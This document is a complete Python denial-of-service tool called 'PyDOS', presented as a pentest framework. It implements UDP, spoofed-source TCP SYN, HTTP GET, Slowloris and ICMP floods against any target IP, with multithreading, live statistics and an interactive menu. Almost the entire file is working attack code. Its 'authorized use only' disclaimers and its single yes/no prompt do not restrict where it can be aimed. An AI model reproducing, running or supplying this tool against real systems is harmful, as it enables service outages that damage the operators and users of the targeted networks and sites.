#!/usr/bin/env python3
"""
=============================================================
  PyDOS - Pentest DoS Testing Framework
  For authorized penetration testing only.
  Unauthorized use is illegal.
=============================================================
"""

import socket
import threading
import random
import time
import struct
import argparse
import sys
import os
from datetime import datetime

# ─── COLORS ───────────────────────────────────────────────
R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"
C = "\033[96m"; W = "\033[97m"; D = "\033[0m"; B = "\033[1m"

BANNER = f"""
{R}{B}
 ██████╗ ██╗   ██╗██████╗  ██████╗ ███████╗
 ██╔══██╗╚██╗ ██╔╝██╔══██╗██╔═══██╗██╔════╝
 ██████╔╝ ╚████╔╝ ██║  ██║██║   ██║███████╗
 ██╔═══╝   ╚██╔╝  ██║  ██║██║   ██║╚════██║
 ██║        ██║   ██████╔╝╚██████╔╝███████║
 ╚═╝        ╚═╝   ╚═════╝  ╚═════╝ ╚══════╝
{D}{Y}    Pentest DoS Framework - Educational Use Only{D}
{R}    AUTHORIZED TESTING ONLY - ILLEGAL TO MISUSE{D}
"""

# ─── STATS ────────────────────────────────────────────────
stats = {"sent": 0, "errors": 0, "start": 0, "running": False}
lock  = threading.Lock()

def log(msg, color=W):
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"{color}[{ts}] {msg}{D}")

def print_stats():
    while stats["running"]:
        elapsed = time.time() - stats["start"]
        rate    = stats["sent"] / max(elapsed, 1)
        print(f"\r{C}[STATS] Sent: {B}{stats['sent']}{D}{C}  Errors: {R}{stats['errors']}{D}{C}  "
              f"Rate: {G}{rate:.0f}/s{D}{C}  Elapsed: {Y}{elapsed:.0f}s{D}  ", end="", flush=True)
        time.sleep(0.5)
    print()

# ══════════════════════════════════════════════════════════
#  METHOD 1 ─ UDP FLOOD
#  Envoie de gros paquets UDP sur un port cible.
#  Efficace contre des services UDP (DNS, NTP, jeux...).
# ══════════════════════════════════════════════════════════
def udp_flood(target_ip, target_port, duration, threads):
    payload = random.randbytes(1024)

    def worker():
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        end  = time.time() + duration
        while time.time() < end and stats["running"]:
            try:
                sock.sendto(payload, (target_ip, target_port))
                with lock: stats["sent"] += 1
            except Exception:
                with lock: stats["errors"] += 1
        sock.close()

    _launch_threads(worker, threads)

# ══════════════════════════════════════════════════════════
#  METHOD 2 ─ TCP SYN FLOOD (raw socket, root requis)
#  Envoie des paquets SYN sans completer le handshake.
#  Epuise la table de connexions semi-ouvertes du serveur.
# ══════════════════════════════════════════════════════════
def tcp_syn_flood(target_ip, target_port, duration, threads):
    def checksum(data):
        if len(data) % 2 != 0:
            data += b"\x00"
        s = 0
        for i in range(0, len(data), 2):
            w = (data[i] << 8) + data[i+1]
            s += w
        s  = (s >> 16) + (s & 0xFFFF)
        s += (s >> 16)
        return ~s & 0xFFFF

    def build_syn(src_ip, dst_ip, dst_port):
        ip_ver_ihl   = (4 << 4) | 5
        ip_tos       = 0
        ip_tot_len   = 0
        ip_id        = random.randint(0, 65535)
        ip_frag_off  = 0
        ip_ttl       = 64
        ip_proto     = socket.IPPROTO_TCP
        ip_chk       = 0
        ip_src       = socket.inet_aton(src_ip)
        ip_dst       = socket.inet_aton(dst_ip)
        ip_hdr = struct.pack("!BBHHHBBH4s4s",
            ip_ver_ihl, ip_tos, ip_tot_len, ip_id,
            ip_frag_off, ip_ttl, ip_proto, ip_chk, ip_src, ip_dst)

        src_port = random.randint(1024, 65535)
        seq      = random.randint(0, 4294967295)
        ack_seq  = 0
        doff     = (5 << 4)
        flags    = 0x002
        window   = socket.htons(5840)
        tcp_chk  = 0
        urg_ptr  = 0
        tcp_hdr  = struct.pack("!HHLLBBHHH",
            src_port, dst_port, seq, ack_seq,
            doff, flags, window, tcp_chk, urg_ptr)

        pseudo = struct.pack("!4s4sBBH",
            ip_src, ip_dst, 0, socket.IPPROTO_TCP, len(tcp_hdr))
        tcp_chk = checksum(pseudo + tcp_hdr)
        tcp_hdr = struct.pack("!HHLLBBHHH",
            src_port, dst_port, seq, ack_seq,
            doff, flags, window, tcp_chk, urg_ptr)
        return ip_hdr + tcp_hdr

    def worker():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except PermissionError:
            log("SYN Flood requires root privileges (sudo).", R)
            return
        end = time.time() + duration
        while time.time() < end and stats["running"]:
            try:
                src_ip = f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
                pkt    = build_syn(src_ip, target_ip, target_port)
                sock.sendto(pkt, (target_ip, 0))
                with lock: stats["sent"] += 1
            except Exception:
                with lock: stats["errors"] += 1
        sock.close()

    _launch_threads(worker, threads)

# ══════════════════════════════════════════════════════════
#  METHOD 3 ─ HTTP FLOOD (Layer 7 GET)
#  Inonde un serveur HTTP de requetes GET legitimes.
#  Contourne les firewalls reseau (trafic valide).
# ══════════════════════════════════════════════════════════
def http_flood(target_ip, target_port, path, duration, threads):
    def worker():
        end = time.time() + duration
        while time.time() < end and stats["running"]:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((target_ip, target_port))
                ua = random.choice([
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/117.0",
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/605.1.15",
                ])
                req = (
                    f"GET {path}?{random.randint(0,9999)} HTTP/1.1\r\n"
                    f"Host: {target_ip}\r\n"
                    f"User-Agent: {ua}\r\n"
                    f"Accept: */*\r\n"
                    f"Connection: keep-alive\r\n\r\n"
                )
                s.send(req.encode())
                with lock: stats["sent"] += 1
                s.close()
            except Exception:
                with lock: stats["errors"] += 1

    _launch_threads(worker, threads)

# ══════════════════════════════════════════════════════════
#  METHOD 4 ─ SLOWLORIS
#  Maintient des connexions HTTP partielles ouvertes.
#  Epuise le pool de connexions du serveur (Apache++).
# ══════════════════════════════════════════════════════════
def slowloris(target_ip, target_port, duration, sockets=200):
    socks_list = []
    log(f"Slowloris: opening {sockets} sockets...", Y)

    end = time.time() + duration
    for _ in range(sockets):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target_ip, target_port))
            s.send(f"GET /?{random.randint(0,9999)} HTTP/1.1\r\n".encode())
            s.send(f"Host: {target_ip}\r\n".encode())
            s.send(b"User-Agent: Mozilla/5.0\r\n")
            s.send(b"Accept-language: en-US,en;q=0.5\r\n")
            socks_list.append(s)
            with lock: stats["sent"] += 1
        except Exception:
            with lock: stats["errors"] += 1

    while time.time() < end and stats["running"]:
        for s in list(socks_list):
            try:
                s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                with lock: stats["sent"] += 1
            except Exception:
                socks_list.remove(s)
                try:
                    ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    ns.settimeout(4)
                    ns.connect((target_ip, target_port))
                    ns.send(f"GET /?{random.randint(0,9999)} HTTP/1.1\r\n".encode())
                    ns.send(f"Host: {target_ip}\r\n".encode())
                    ns.send(b"User-Agent: Mozilla/5.0\r\n")
                    socks_list.append(ns)
                except Exception:
                    with lock: stats["errors"] += 1
        time.sleep(15)

    for s in socks_list:
        try: s.close()
        except: pass

# ══════════════════════════════════════════════════════════
#  METHOD 5 ─ ICMP FLOOD (ping flood, root requis)
#  Sature la bande passante et le CPU reseau de la cible
#  avec des paquets ICMP Echo Request.
# ══════════════════════════════════════════════════════════
def icmp_flood(target_ip, duration, threads):
    def checksum(data):
        if len(data) % 2:
            data += b"\x00"
        s = sum((data[i] << 8) + data[i+1] for i in range(0, len(data), 2))
        s  = (s >> 16) + (s & 0xFFFF)
        return ~(s + (s >> 16)) & 0xFFFF

    def build_icmp():
        icmp_type = 8; code = 0; chk = 0; pid = os.getpid() & 0xFFFF; seq = 1
        hdr  = struct.pack("bbHHh", icmp_type, code, chk, pid, seq)
        data = b"x" * 56
        chk  = checksum(hdr + data)
        return struct.pack("bbHHh", icmp_type, code, chk, pid, seq) + data

    def worker():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        except PermissionError:
            log("ICMP Flood requires root privileges (sudo).", R)
            return
        pkt = build_icmp()
        end = time.time() + duration
        while time.time() < end and stats["running"]:
            try:
                s.sendto(pkt, (target_ip, 0))
                with lock: stats["sent"] += 1
            except Exception:
                with lock: stats["errors"] += 1
        s.close()

    _launch_threads(worker, threads)

# ─── THREAD LAUNCHER ──────────────────────────────────────
def _launch_threads(fn, n):
    pool = [threading.Thread(target=fn, daemon=True) for _ in range(n)]
    for t in pool: t.start()
    for t in pool: t.join()

# ─── MAIN RUNNER ──────────────────────────────────────────
def run_attack(method, target_ip, target_port, duration, threads, path="/", sockets=200):
    print(f"""
{Y}  Target  : {W}{target_ip}:{target_port}
{Y}  Method  : {W}{method.upper()}
{Y}  Threads : {W}{threads}
{Y}  Duration: {W}{duration}s
{R}  [!] Ensure you have WRITTEN AUTHORIZATION before proceeding.{D}
""")
    confirm = input(f"{R}Proceed? (yes/no): {D}").strip().lower()
    if confirm != "yes":
        log("Aborted.", Y); return

    stats["sent"] = 0; stats["errors"] = 0
    stats["start"] = time.time(); stats["running"] = True

    stat_thread = threading.Thread(target=print_stats, daemon=True)
    stat_thread.start()
    log(f"Attack started [{method.upper()}]...", G)

    try:
        if   method == "udp":       udp_flood(target_ip, target_port, duration, threads)
        elif method == "syn":       tcp_syn_flood(target_ip, target_port, duration, threads)
        elif method == "http":      http_flood(target_ip, target_port, path, duration, threads)
        elif method == "slowloris": slowloris(target_ip, target_port, duration, sockets)
        elif method == "icmp":      icmp_flood(target_ip, duration, threads)
        else: log(f"Unknown method: {method}", R)
    except KeyboardInterrupt:
        log("Interrupted by user.", Y)
    finally:
        stats["running"] = False
        stat_thread.join(timeout=1)

    elapsed = time.time() - stats["start"]
    log(f"Done. Sent: {stats['sent']}  Errors: {stats['errors']}  Time: {elapsed:.1f}s", G)

# ─── CLI ──────────────────────────────────────────────────
def interactive_menu():
    print(BANNER)
    methods = [
        ("udp",       "UDP Flood        - Layer 4, high-rate UDP packets"),
        ("syn",       "TCP SYN Flood    - Half-open connections (root)"),
        ("http",      "HTTP GET Flood   - Layer 7, bypasses L3/L4 firewalls"),
        ("slowloris", "Slowloris        - Partial HTTP keep-alive attack"),
        ("icmp",      "ICMP Ping Flood  - Bandwidth saturation (root)"),
    ]
    print(f"{C}Available methods:{D}")
    for i, (k, v) in enumerate(methods, 1):
        print(f"  {Y}{i}{D}. {G}{k:12}{D} {v}")
    print()

    keys = [m[0] for m in methods]
    choice = input(f"{C}Method (1-5 or name): {D}").strip()
    method = keys[int(choice)-1] if choice.isdigit() and 1 <= int(choice) <= 5 else choice

    target_ip   = input(f"{C}Target IP   : {D}").strip()
    target_port = int(input(f"{C}Target Port : {D}").strip() or "80")
    duration    = int(input(f"{C}Duration(s) : {D}").strip() or "30")
    threads     = int(input(f"{C}Threads     : {D}").strip() or "100")
    path    = "/"
    sockets = 200
    if method == "http":
        path = input(f"{C}HTTP Path   : {D}").strip() or "/"
    if method == "slowloris":
        sockets = int(input(f"{C}Sockets     : {D}").strip() or "200")

    run_attack(method, target_ip, target_port, duration, threads, path, sockets)

def main():
    parser = argparse.ArgumentParser(
        description="PyDOS - Pentest DoS Testing Framework",
        formatter_class=argparse.RawTextHelpFormatter
    )
    parser.add_argument("-m", "--method",   help="udp | syn | http | slowloris | icmp")
    parser.add_argument("-t", "--target",   help="Target IP address")
    parser.add_argument("-p", "--port",     type=int, default=80,  help="Target port")
    parser.add_argument("-d", "--duration", type=int, default=30,  help="Duration in seconds")
    parser.add_argument("-T", "--threads",  type=int, default=100, help="Number of threads")
    parser.add_argument("--path",           default="/",           help="HTTP path (http method)")
    parser.add_argument("--sockets",        type=int, default=200, help="Max sockets (slowloris)")
    args = parser.parse_args()

    if not args.method or not args.target:
        interactive_menu()
    else:
        print(BANNER)
        run_attack(args.method, args.target, args.port,
                   args.duration, args.threads, args.path, args.sockets)

if __name__ == "__main__":
    main()
